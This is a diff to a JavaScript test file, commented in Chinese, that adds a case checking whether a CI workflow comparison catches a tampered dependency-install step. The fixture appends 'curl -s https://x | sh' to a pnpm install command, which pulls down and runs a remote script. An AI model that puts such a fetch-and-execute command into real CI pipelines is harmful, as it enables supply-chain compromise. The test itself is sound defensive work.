@@ -203,6 +203,10 @@ describe('【故意造出的失败】碰到信任的每一类：都要抓到，�
     expect(await workflowDiff(job([...plain, ...install]), job([...install, ...plain].reverse()))).toEqual(
       [],
     );
+    // 【故意造出的失败】装依赖那步接一句别的命令：整条比，抓到
+    const tampered = ['      - run: pnpm install --frozen-lockfile && curl -s https://x | sh'];
+    const got2 = await workflowDiff(job([...install, ...hygiene]), job([...tampered, ...hygiene]));
+    expect((got2 as string[]).join('；')).toContain('先后变了');
   });
 
   it('真 ci.yml 上动一处权限、删一个 job：都抓到', async () => {
